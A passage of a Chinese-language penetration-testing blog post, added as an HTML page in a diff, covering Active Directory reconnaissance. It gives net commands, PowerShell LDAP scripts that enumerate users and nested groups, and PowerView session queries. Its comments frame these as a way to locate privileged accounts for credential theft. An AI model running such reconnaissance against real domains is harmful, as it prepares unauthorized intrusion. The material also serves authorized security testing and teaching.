@@ -1,0 +1,696 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  域渗透实战 | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="域渗透实战 | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="https://test692618.github.io/post/ad%E5%9F%9F/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="2026-04-24T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-04-24T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/other_site"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">常用网站</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="域渗透实战"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">域渗透实战</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息枚举">信息枚举</a></li>
+    <li><a href="#本地账户攻击">本地账户攻击</a></li>
+    <li><a href="#服务账户攻击">服务账户攻击</a></li>
+    <li><a href="#低速口令枚举">低速口令枚举</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">83</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-email sidebar-social-icon">
+      <a
+        href="#ZgotmplZ"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/other_site"
+        aria-label="常用网站"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">常用网站</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2026-04-24 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-04-24</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2026-04-24</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="信息枚举">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%9e%9a%e4%b8%be"></a>
+信息枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user #枚举本地账户
+</span></span><span class="line"><span class="cl">net user /domain  #枚举域内所有账户
+</span></span><span class="line"><span class="cl">net user [用户名] /domain # 查看用户详情，所在组。域内最高权限组为“domain admins”。
+</span></span><span class="line"><span class="cl">net group /domain  # 枚举域内组
+</span></span></code></pre></div><p>使用powershell进行信息枚举</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 枚举当前所在域的信息</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="nb">hr-user</span><span class="p">&gt;</span> <span class="p">[</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">Forest</span>                  <span class="err">:</span> <span class="n">liu</span><span class="p">.</span><span class="py">ssxx</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DomainControllers</span>       <span class="err">:</span> <span class="p">{</span><span class="nb">WIN-UJT5JVDTRSO</span><span class="p">.</span><span class="py">hr</span><span class="p">.</span><span class="py">liu</span><span class="p">.</span><span class="n">ssxx</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Children</span>                <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DomainMode</span>              <span class="err">:</span> <span class="n">Unknown</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DomainModeLevel</span>         <span class="err">:</span> <span class="mf">7</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Parent</span>                  <span class="err">:</span> <span class="n">liu</span><span class="p">.</span><span class="py">ssxx</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PdcRoleOwner</span>            <span class="err">:</span> <span class="nb">WIN-UJT5JVDTRSO</span><span class="p">.</span><span class="py">hr</span><span class="p">.</span><span class="py">liu</span><span class="p">.</span><span class="py">ssxx</span>   <span class="c">#主域控的名称</span>
+</span></span><span class="line"><span class="cl">	<span class="n">RidRoleOwner</span>            <span class="err">:</span> <span class="nb">WIN-UJT5JVDTRSO</span><span class="p">.</span><span class="py">hr</span><span class="p">.</span><span class="py">liu</span><span class="p">.</span><span class="py">ssxx</span>
+</span></span><span class="line"><span class="cl">	<span class="n">InfrastructureRoleOwner</span> <span class="err">:</span> <span class="nb">WIN-UJT5JVDTRSO</span><span class="p">.</span><span class="py">hr</span><span class="p">.</span><span class="py">liu</span><span class="p">.</span><span class="py">ssxx</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Name</span>                    <span class="err">:</span> <span class="n">hr</span><span class="p">.</span><span class="py">liu</span><span class="p">.</span><span class="py">ssxx</span>    <span class="c">#所在域的名称</span>
+</span></span><span class="line"><span class="cl"><span class="p">---------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#枚举域内所有账户</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$domainObj</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$PDC</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">).</span><span class="py">Name</span>  <span class="c">#到此是获取PDC信息。解释,PDC：主域控。</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$PDC</span> <span class="p">+</span> <span class="s2">&#34;/&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="s2">&#34;DC=</span><span class="p">$(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="py">Name</span><span class="p">.</span><span class="py">Replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;,DC=&#39;</span><span class="p">))</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$DistinguishedName</span>    <span class="c">#到此为止是组合完整LDAP路径。 eg，LDAP://DC01.corp.com/DC=corp,DC=com</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectorySearcher</span><span class="p">([</span><span class="no">ADSI</span><span class="p">]</span><span class="nv">$SearchString</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$objDomain</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectoryEntry</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="py">SearchRoot</span> <span class="p">=</span> <span class="nv">$objDomain</span> <span class="c">#到此为创建搜索对象</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&#34;samAccountType=805306368&#34;</span>  <span class="c">#到此为设置LDAP搜索过滤器，samAccountType=805306368 表示搜索&#34;用户账户&#34;（USER_OBJECT）这是Active Directory中用户对象的特定类型代码，过滤器可根据自己需要调整。</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Result</span> <span class="p">=</span> <span class="nv">$Searcher</span><span class="p">.</span><span class="py">FindAll</span><span class="p">()</span> <span class="c">#执行搜索</span>
+</span></span><span class="line"><span class="cl"><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$Result</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">Foreach</span><span class="p">(</span><span class="nv">$prop</span> <span class="k">in</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Properties</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$prop</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="s2">&#34;------------------------&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>   <span class="c">#遍历结果</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c">#解析嵌套组</span>
+</span></span><span class="line"><span class="cl"><span class="c">#由于windwos组权限复杂，存在多层嵌套，一个组内可能嵌套其他组，因此需要此操作，理清账户组的权限关系，组内包含哪些账号。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">第一步</span><span class="err">，</span><span class="n">列出所有组</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$domainObj</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$PDC</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">).</span><span class="py">Name</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$PDC</span> <span class="p">+</span> <span class="s2">&#34;/&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="s2">&#34;DC=</span><span class="p">$(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="py">Name</span><span class="p">.</span><span class="py">Replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;,DC=&#39;</span><span class="p">))</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$DistinguishedName</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectorySearcher</span><span class="p">([</span><span class="no">ADSI</span><span class="p">]</span><span class="nv">$SearchString</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$objDomain</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectoryEntry</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="py">SearchRoot</span> <span class="p">=</span> <span class="nv">$objDomain</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&#34;(objectClass=Group)&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Result</span> <span class="p">=</span> <span class="nv">$Searcher</span><span class="p">.</span><span class="py">FindAll</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$Result</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$obj</span><span class="p">.</span><span class="py">Properties</span><span class="p">.</span><span class="py">name</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="n">输出</span><span class="err">：</span><span class="n">一列组</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">第二步</span><span class="err">：</span><span class="n">选择要查询的组</span><span class="err">。</span><span class="n">结果会列出包含的子组或者组内账户</span><span class="err">，</span><span class="n">若查询结果仍为组</span><span class="err">，</span><span class="n">继续操作此步骤</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$domainObj</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$PDC</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="n">PdcRoleOwner</span><span class="p">).</span><span class="py">Name</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">=</span> <span class="s2">&#34;LDAP://&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$PDC</span> <span class="p">+</span> <span class="s2">&#34;/&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="s2">&#34;DC=</span><span class="p">$(</span><span class="nv">$domainObj</span><span class="p">.</span><span class="py">Name</span><span class="p">.</span><span class="py">Replace</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;,DC=&#39;</span><span class="p">))</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$SearchString</span> <span class="p">+=</span> <span class="nv">$DistinguishedName</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectorySearcher</span><span class="p">([</span><span class="no">ADSI</span><span class="p">]</span><span class="nv">$SearchString</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$objDomain</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">DirectoryServices</span><span class="p">.</span><span class="py">DirectoryEntry</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="py">SearchRoot</span> <span class="p">=</span> <span class="nv">$objDomain</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$Searcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&#34;(name=Domain Admins)&#34;</span>   <span class="p">//</span> <span class="n">name值设置要查询的组</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Result</span> <span class="p">=</span> <span class="nv">$Searcher</span><span class="p">.</span><span class="py">FindAll</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$Result</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nv">$obj</span><span class="p">.</span><span class="py">Properties</span><span class="p">.</span><span class="n">member</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">输出</span><span class="err">：</span><span class="n">CN</span><span class="p">=</span><span class="n">Administrator</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">hr</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">liu</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">ssxx</span>  <span class="p">//</span><span class="n">存在用户</span> <span class="n">administrator</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c">#通过PowerView.ps1枚举登录的用户。目的：寻找高权限账户在哪个服务器，以便锁定攻击目标和通过缓存获取鉴别信息。</span>
+</span></span><span class="line"><span class="cl"><span class="c">#注意下面的命令需要具备管理员权限。</span>
+</span></span><span class="line"><span class="cl"><span class="c">#PowerView.ps1是一款基于 PowerShell的 Active Directory（AD）信息收集与侦察脚本，主要用于渗透测试中的内网域环境枚举。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ExecutionPolicy</span> <span class="n">RemoteSigned</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>  <span class="c"># 解除ps执行限制</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>  <span class="c"># 导入powerview脚本</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">dc01</span>  <span class="c">#其作用是查询目标计算机（此处是域控制器 dc01）上的活动网络会话。用于查询网络共享会话。可以看到哪些主机、哪些账户和目标机器建立了连接。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-NetLoggedon</span> <span class="n">-ComputerName</span> <span class="n">client251</span> <span class="c"># 用于枚举目标计算机（此处是 client251）上当前登录的所有用户。用于查询本地登录会话。</span>
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c">#枚举服务主体名-SPN-serviceprincipalname</span>
+</span></span><span class="line"><span class="cl"><span class="c">#目的：快速获取域服务位置。</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$domainObj</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span> 
